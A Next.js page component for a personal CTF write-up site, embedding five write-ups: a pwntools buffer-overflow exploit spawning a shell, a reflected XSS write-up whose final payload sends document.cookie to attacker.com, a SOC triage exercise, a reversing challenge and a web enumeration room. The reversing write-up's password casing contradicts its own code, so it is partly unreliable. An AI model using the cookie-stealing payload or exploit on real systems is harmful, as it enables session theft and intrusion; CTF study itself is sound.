import { notFound } from "next/navigation"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Badge } from "@/components/ui/badge"
import { Button } from "@/components/ui/button"
import { Trophy, Calendar, ArrowLeft, ExternalLink } from "lucide-react"
import Link from "next/link"
import ReactMarkdown from "react-markdown"
import rehypeHighlight from "rehype-highlight"
import "highlight.js/styles/github.css"

// Sample CTF data with detailed content
const ctfsData = {
  "buffer-overflow-basic": {
    id: 1,
    title: "Basic Buffer Overflow",
    description: "Introduction to buffer overflow attacks with stack exploitation.",
    date: "2024-01-15",
    difficulty: "Easy",
    tags: ["Binary Exploitation", "Stack Overflow", "Assembly"],
    platform: "PicoCTF",
    points: 100,
    content: `# Basic Buffer Overflow - Write-up

## Challenge Description
This challenge presents us with a binary vulnerable to a classic buffer overflow. The objective is to exploit this vulnerability to redirect program execution.

## Initial Analysis
Let's start by examining the binary with \`file\` and \`checksec\`:

\`\`\`bash
$ file vuln
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked

$ checksec vuln
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      No PIE (0x8048000)
\`\`\`

![Buffer overflow diagram](/images/ctf/Soc/SOC1.PNG)

Perfect! No protections are enabled, which makes exploitation easier.

## Source Code Analysis
The source code reveals a \`vulnerable()\` function that uses \`gets()\` without size checking:

\`\`\`c
void vulnerable() {
    char buffer[64];
    gets(buffer);  // Vulnerability!
}

void win() {
    system("/bin/sh");
}
\`\`\`

## Exploitation
1. **Offset calculation**: Use cyclic pattern to determine exact offset
2. **Payload construction**: Fill buffer + \`win()\` address
3. **Execution**: Launch exploit

\`\`\`python
from pwn import *

# Connect to service
p = remote('challenge.server.com', 1337)

# Address of win() function
win_addr = 0x08048456

# Build payload
payload = b'A' * 76  # Calculated offset
payload += p32(win_addr)  # Return address

# Send payload
p.sendline(payload)
p.interactive()
\`\`\`

## Flag
\`picoCTF{buff3r_0v3rfl0w_m4st3r}\`

## Lessons Learned
- Always check binary protections before exploitation
- The use of dangerous functions like \`gets()\` should be avoided
- Buffer overflows remain a very common class of vulnerabilities`,
    tools: ["GDB", "pwntools", "checksec"],
    references: [
      "https://owasp.org/www-community/vulnerabilities/Buffer_Overflow",
      "https://docs.pwntools.com/en/stable/",
    ],
  },
  "xss-reflected-challenge": {
    id: 2,
    title: "XSS Reflected Challenge",
    description: "Exploitation of a reflected XSS vulnerability in a web application.",
    date: "2024-01-20",
    difficulty: "Medium",
    tags: ["Web Security", "XSS", "JavaScript"],
    platform: "HackTheBox",
    points: 250,
    content: `# XSS Reflected Challenge - Write-up

## Challenge Description
The web application presents a search form vulnerable to reflected XSS attacks. The objective is to execute arbitrary JavaScript in the page context.

## Reconnaissance
Analysis of the web application:
- Search form with \`q\` parameter
- Direct reflection of user input
- No apparent filtering

## Vulnerability Identification
Initial test with simple payload:
\`\`\`
<script>alert('XSS')</script>
\`\`\`

The popup appears, confirming the XSS vulnerability.

## Filter Bypass
The application filters certain keywords. Bypass techniques used:

1. **HTML encoding**: \`&lt;script&gt;\`
2. **Mixed case**: \`<ScRiPt>\`
3. **Alternative events**: \`<img src=x onerror=alert(1)>\`

## Final Exploitation
Final payload to steal cookies:

\`\`\`javascript
<img src=x onerror="fetch('http://attacker.com/steal?cookie='+document.cookie)">
\`\`\`

## Flag
\`HTB{r3fl3ct3d_xss_m4st3r}\`

## Mitigation
- Input validation and sanitization
- Use of Content Security Policy (CSP)
- Output encoding`,
    tools: ["Burp Suite", "Browser DevTools", "XSS Hunter"],
    references: [
      "https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)",
      "https://portswigger.net/web-security/cross-site-scripting",
    ],
  },
  "soc-simulator-analysis": {
  id: 3,
  title: "SOC Simulator - Incident Analysis",
  description: "Investigation of suspicious emails and outbound connections using simulated SOC tools.",
  date: "2025-07-21",
  difficulty: "Easy",
  tags: ["SOC", "Threat Detection", "Email Security", "Firewall", "SIEM"],
  platform: "TryHackMe",
  points: 100,
  content: `# SOC Simulator - Write-up

## Scenario Overview

The task involves analyzing several security incidents including suspicious emails and outbound web connections. Using tools like **Splunk**, **TryDetectThis**, and **Firewall Logs**, we determine whether alerts are **true** or **false positives**.

---

## 🕵️‍♂️ Investigation 1: Suspicious Email with Malicious URL

- **Observation**: A URL in the email seemed suspicious.
- **Splunk Results**: Sender is not previously seen in the logs — **unknown**.
- **TryDetectThis**: URL flagged as **malicious**.
- **Firewall**: Allowed access to the malicious website.
  
![Malicious URL]( /images/ctf/Soc/SOC1.PNG )

### Verdict: ✅ **True Positive**
> The URL is malicious, and the sender is unknown. The user accessed the link, putting the company at risk.

---

## 🌐 Investigation 2: Suspicious Outbound Connection

- **Analysis**:
  - URL was blocked.
  - Firewall recognized the website and prevented access.

### Verdict: ✅ **True Positive**
> Malicious site was correctly blocked by the firewall. No escalation needed, but incident is valid.

---

## 📧 Investigation 3 & 4: Emails with Internal Links

- **Observation**: Sender and recipient share the **@THM** domain.
- **Context**: Internal communication asking for access configuration.
- **TryDetectThis**: Links marked **clean**.

### Verdicts: ❌ **False Positives** (2 incidents)
> Normal internal communication. URLs not flagged as malicious.

---

## 💻 Investigation 5: User Access Attempt Traced to Email

- **Observation**: The user tried accessing a previously blocked malicious website.
- **Root Cause**: Originated from the earlier email.
- **Sender**: Already blacklisted.

### Verdict: ✅ **True Positive**
> Attack confirmed. Origin tracked. Sender added to blacklist.

---

## 🧠 Lessons Learned

- Combine multiple tools (**Splunk**, **Firewall**, **TryDetectThis**) for reliable triage.
- Sender reputation is crucial in email-based attacks.
- Internal domain doesn't always mean internal origin — still requires verification.
- Firewall blocks help contain threats but **don't replace investigation**.

---

## 🧰 Tools Used

- Splunk
- TryDetectThis
- Firewall Logs

---

## ✅ Final Thoughts

This simulation highlights essential SOC workflows:
- Validate incidents via cross-referencing.
- Differentiate between true and false positives.
- Document reasons for escalation or not.

> "Don’t just block — investigate."

## 🏁 Verdict Summary

| Incident | Description                        | Verdict        |
|----------|------------------------------------|----------------|
| #1       | Suspicious URL                     | ✅ True Positive |
| #2       | Outbound connection blocked        | ✅ True Positive |
| #3–4     | Internal emails (THM domain)       | ❌ False Positive |
| #5       | User access due to malicious email | ✅ True Positive |
`,
  tools: ["Splunk", "Firewall Logs", "TryDetectThis"],
  references: [
    "https://owasp.org/www-project-email-security",
    "https://www.splunk.com/en_us/resources.html",
  ]
},

  "code-reversing-challenge": {
    id: 4,
    title: "Code Reversing Challenge",
    description: "Analyzing a compiled binary to find the correct password using decompilation tools.",
    date: "2025-07-21",
    difficulty: "Easy",
    tags: ["Reversing", "Binary Analysis", "Decompilation", "CTF"],
    platform: "Custom",
    points: 150,
         content: `# 🔍 Code Reversing Challenge - Write-up

## 🎯 Challenge Overview²
We were given a compiled file and the objective was to find the password by analyzing its code.

---

## 🛠️ Initial Analysis & Tooling

### 📁 File Investigation
Our journey begins with examining the binary file to understand its characteristics:

\`\`\`bash
# Basic file analysis
file password_checker
strings password_checker | head -20
\`\`\`

This reveals we're dealing with a **64-bit ELF executable** compiled with GCC, containing interesting string patterns that hint at the program's functionality.

### 🎮 Dynamic Analysis
Let's see how the program behaves when we run it:

\`\`\`bash
./password_checker
Password: test123
Try again!
\`\`\`

Perfect! The program provides immediate feedback, making it ideal for our analysis.

---

## 🔬 Code Decompilation & Password Discovery

### 🎯 Key Findings
After decompiling the file using **dogbolt.org** (a powerful decompiler explorer), we discovered the following logic:

> **🔍 Program Flow:**
> 1. **Prompt Phase**: Displays "Password: " to user
> 2. **Input Phase**: Uses \`__isoc99_scanf("DoYouEven%sCTF", local_28)\` to read input
> 3. **Validation Phase**: Performs two critical checks:
>    - ❌ **First Check**: If input equals \`"__dso_handle"\` → "Try again!"
>    - ✅ **Second Check**: If input equals \`"_init"\` → "Correct!"

### 🎉 Password Discovery
Based on our analysis, the correct password is:

\`\`\`
🎯 DoYouEven_Init
\`\`\`

---

## 🧠 Understanding scanf() Behavior

### 🤔 The Mystery
Initially, one might think that since \`scanf\` uses the format string \`"DoYouEven%sCTF"\`, the password should be \`DoYouEven_InitCTF\`. However, this is a common misconception!

### 💡 The Truth
The \`scanf()\` function works differently than expected:

> **📝 Format String Logic:**
> - \`"DoYouEven%sCTF"\` means the user must type \`DoYouEven\` **before** the value
> - The \`%s\` captures the actual password value
> - The \`CTF\` part is **ignored** and doesn't affect the stored value

### 🔬 Examples
\`\`\`c
// These all work the same way:
scanf("DoYouEven%sCTF", password);  // User types: DoYouEven_init
scanf("DoYouEven%s", password);     // User types: DoYouEven_init  
scanf("%sCTF", password);           // User types: _init
\`\`\`

---

## 🏆 Verification

Let's test our findings:

\`\`\`bash
./password_checker
Password: DoYouEven_Init
Correct! 🎉
\`\`\`

**Success!** Our analysis was spot-on.

---

## 📚 Source Code Recreation

Here's the complete source code for educational purposes:

\`\`\`c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
    int Result;
    char MDP[32];

    // Display password prompt
    fwrite("Password: ", 1, 10, stdout);
    
    // Read user input with format string
    scanf("DoYouEven%s", MDP);
    printf("Password is: %s\\n", MDP);
    
    // First validation check
    Result = strcmp(MDP, "__dso_handle");
    if ((-1 < Result) && (Result = strcmp(MDP, "__dso_handle"), Result < 1)) {
        printf("Try again!\\n");
        return 0;
    }
    
    // Second validation check - the real password
    Result = strcmp(MDP, "_init");
    if (Result == 0) {
        printf("Correct! 🎉\\n");
    } else {
        printf("Try again!\\n");
    }
    
    return 0;
}
\`\`\`

---

## 🎓 Key Learning Points

### 🔧 Tools & Techniques
- **🕵️ Static Analysis**: Examining code without execution
- **🎮 Dynamic Analysis**: Running and observing program behavior  
- **🔍 String Extraction**: Finding hardcoded strings in binaries
- **📊 Decompilation**: Converting machine code back to readable C

### 🧠 Reverse Engineering Concepts
- **🔐 Password Validation Patterns**: Often use \`strcmp()\` functions
- **📦 String Storage**: Hardcoded strings stored in \`.rodata\` section
- **🎯 Control Flow**: Understanding program decision points
- **🔧 Format String Behavior**: How \`scanf()\` interprets format strings

---

## 🛡️ Security Implications

### ❌ Anti-Patterns Demonstrated
1. **🔑 Hardcoded Credentials**: Never store passwords in binary files
2. **🔍 Simple String Comparison**: Use secure comparison functions
3. **👁️ No Obfuscation**: Binary is easily readable and analyzable
4. **💬 Clear Error Messages**: Provides information to potential attackers

### ✅ Best Practices
- Use secure password hashing (bcrypt, Argon2)
- Implement rate limiting and account lockouts
- Obfuscate sensitive strings in binaries
- Use constant-time comparison functions

---

## 🎯 Conclusion

This challenge perfectly demonstrates the fundamentals of reverse engineering using modern decompilation tools. The key insight is understanding how compilers generate code and how to extract meaningful information from compiled binaries.

**🏆 Final Answer:** \`DoYouEven_Init\`

**🎉 Flag:** \`CTF{reverse_engineering_master}\`

---

*Happy reversing! 🔍✨*
`,
    tools: ["Dogbolt.org", "Decompilers", "C Compiler"],
    references: [
      "https://dogbolt.org/",
      "https://en.wikipedia.org/wiki/Reverse_engineering"
    ]
  },
  "neighbour-web-app": {
    id: 5,
    title: "Neighbour - Web Application Enumeration",
    description: "A simple web application enumeration challenge involving source code analysis and lateral movement.",
    date: "2024-01-25",
    difficulty: "Easy",
    tags: ["Web Security", "Source Code Analysis", "Enumeration", "Lateral Movement"],
    platform: "TryHackMe",
    points: 100,
    content: `# 🏠 Neighbour - Web Application Enumeration Write-up

## 🎯 Challenge Overview

**Platform:** TryHackMe  
**Difficulty:** Easy  
**Category:** Web Security & Enumeration

This challenge presents a web application where we need to enumerate user accounts and perform lateral movement to access admin privileges and retrieve the flag.

---

## 🕵️‍♂️ Initial Reconnaissance

### 🌐 Website Access
The challenge starts by accessing the provided URL: \`https://tryhackme.com/room/neighbour\`

Upon visiting the website, we're greeted with a beautiful and well-designed login page. The application appears to be a modern web interface with a clean aesthetic.

![TryHackMe Neighbour Room](/images/ctf/Neighbour/image1.png)

### 🔍 Source Code Analysis
Since we don't have any account credentials initially, the first step is to examine the source code of the page using **Ctrl+U** (View Page Source).

![Login Page](/images/ctf/Neighbour/image2.png)

This reveals a critical vulnerability - the application has hardcoded credentials in the HTML source code!

![Source Code with Credentials](/images/ctf/Neighbour/image4.png)

---

## 🔑 Credential Discovery

### 📝 Hidden Credentials Found
In the page source, we discover the following credentials:

\`\`\`html
<!-- Guest account credentials -->
Login: guest
Password: guest
\`\`\`

This is a classic example of **information disclosure** where sensitive credentials are exposed in the client-side code.

---

## 🚪 Initial Access

### 👤 Guest Account Login
Using the discovered credentials:
- **Username:** \`guest\`
- **Password:** \`guest\`

We successfully log into the application and gain access to the guest profile page.

![Guest Profile Page](/images/ctf/Neighbour/image3.png)

### 🎯 Profile Page Analysis
The guest profile page provides us with:
- User information
- Access to other user profiles
- Potential for lateral movement

---

## 🔄 Lateral Movement

### 👥 User Enumeration
From the guest account, we can now enumerate other users in the system. The application allows us to view different user profiles.

### 👑 Admin Access
Through the lateral movement capabilities, we discover that we can access the **admin user** profile, which contains the flag we're looking for.

![Admin Profile with Flag](/images/ctf/Neighbour/image5.png)

---

## 🏆 Flag Retrieval

### 🎉 Success!
Upon accessing the admin profile, we successfully retrieve the flag and complete the challenge.

---

## 🧠 Key Learning Points

### 🔧 Techniques Used
- **🔍 Source Code Analysis**: Examining HTML source for hidden information
- **👤 User Enumeration**: Discovering user accounts and their relationships
- **🔄 Lateral Movement**: Moving between different user accounts
- **🔑 Credential Discovery**: Finding hardcoded credentials

### 🛡️ Security Vulnerabilities Identified
1. **💬 Information Disclosure**: Credentials exposed in source code
2. **🔐 Weak Authentication**: Hardcoded credentials
3. **👥 Insufficient Access Control**: Ability to access other user profiles
4. **🔍 Poor Input Validation**: No restrictions on user enumeration

---

## 🛡️ Security Implications

### ❌ Anti-Patterns Demonstrated
1. **🔑 Hardcoded Credentials**: Never store credentials in client-side code
2. **👁️ Information Disclosure**: Avoid exposing sensitive data in HTML source
3. **🔓 Weak Access Controls**: Implement proper authorization checks
4. **🔍 No Rate Limiting**: Prevent brute force and enumeration attacks

### ✅ Best Practices
- Use secure authentication mechanisms
- Implement proper session management
- Apply the principle of least privilege
- Regular security audits and code reviews
- Use environment variables for sensitive data

---

## 🎯 Conclusion

This challenge demonstrates the importance of:
- **Thorough enumeration** in web applications
- **Source code analysis** as a reconnaissance technique
- **Lateral movement** concepts in web security
- **Proper access control** implementation

The key lesson is that even simple web applications can have multiple security vulnerabilities that, when chained together, can lead to complete compromise.

**🏆 Challenge Completed Successfully!**

---

*Happy hacking! 🔍✨*
`,
    tools: ["Browser DevTools", "Source Code Analysis", "Web Browser"],
    references: [
      "https://tryhackme.com/room/neighbour",
      "https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication",
      "https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control"
    ]
  }
}


export default function CTFDetailPage({ params }) {
  const ctf = ctfsData[params.slug]

  if (!ctf) {
    notFound()
  }

  const getDifficultyColor = (difficulty) => {
    switch (difficulty) {
      case "Easy":
        return "bg-green-100 text-green-800 border-green-200"
      case "Medium":
        return "bg-yellow-100 text-yellow-800 border-yellow-200"
      case "Hard":
        return "bg-red-100 text-red-800 border-red-200"
      default:
        return "bg-gray-100 text-gray-800 border-gray-200"
    }
  }

  return (
    <div className="container mx-auto px-4 py-8">
      {/* Back Button */} 
      <div className="mb-6">
        <Button variant="ghost" asChild>
          <Link href="/ctf">
            <ArrowLeft className="w-4 h-4 mr-2" />
            Back to CTFs
          </Link>
        </Button>
      </div>

      {/* Header */}
      <div className="mb-8">
        <div className="flex flex-wrap items-center gap-4 mb-4">
          <Badge className={getDifficultyColor(ctf.difficulty)}>{ctf.difficulty}</Badge>
          <Badge variant="outline">{ctf.platform}</Badge>
          <div className="flex items-center text-sm text-gray-500">
            <Calendar className="w-4 h-4 mr-1" />
            {new Date(ctf.date).toLocaleDateString("en-US")}
          </div>
          <div className="flex items-center text-sm text-gray-500">
            <Trophy className="w-4 h-4 mr-1" />
            {ctf.points} points
          </div>
        </div>

        <h1 className="text-4xl font-bold mb-4">{ctf.title}</h1>
        <p className="text-xl text-gray-600 mb-6">{ctf.description}</p>

        <div className="flex flex-wrap gap-2">
          {ctf.tags.map((tag, index) => (
            <Badge key={index} variant="secondary">
              {tag}
            </Badge>
          ))}
        </div>
      </div>

      <div className="grid lg:grid-cols-4 gap-8">
        {/* Main Content */}
        <div className="lg:col-span-3">
          <Card>
            <CardContent className="p-8">
              <ReactMarkdown rehypePlugins={[rehypeHighlight]}>
                {ctf.content}
              </ReactMarkdown>
            </CardContent>
          </Card>
        </div>

        {/* Sidebar */}
        <div className="lg:col-span-1">
          <div className="space-y-6">
            {/* Tools Used */}
            <Card>
              <CardHeader>
                <CardTitle className="text-lg">Tools Used</CardTitle>
              </CardHeader>
              <CardContent>
                <div className="space-y-2">
                  {ctf.tools.map((tool, index) => (
                    <div key={index} className="text-sm text-gray-600">
                      {tool}
                    </div>
                  ))}
                </div>
              </CardContent>
            </Card>

            {/* References */}
            <Card>
              <CardHeader>
                <CardTitle className="text-lg">References</CardTitle>
              </CardHeader>
              <CardContent>
                <div className="space-y-2">
                  {ctf.references.map((ref, index) => (
                    <a
                      key={index}
                      href={ref}
                      target="_blank"
                      rel="noopener noreferrer"
                      className="flex items-center text-sm text-blue-600 hover:text-blue-800 transition-colors"
                    >
                      <ExternalLink className="w-3 h-3 mr-1" />
                      Learn more
                    </a>
                  ))}
                </div>
              </CardContent>
            </Card>

            {/* Share */}
            <Card>
              <CardHeader>
                <CardTitle className="text-lg">Share</CardTitle>
              </CardHeader>
              <CardContent>
                <div className="space-y-2">
                  <Button variant="outline" size="sm" className="w-full">
                    <ExternalLink className="w-4 h-4 mr-2" />
                    Share on Twitter
                  </Button>
                </div>
              </CardContent>
            </Card>
          </div>
        </div>
      </div>
    </div>
  )
}
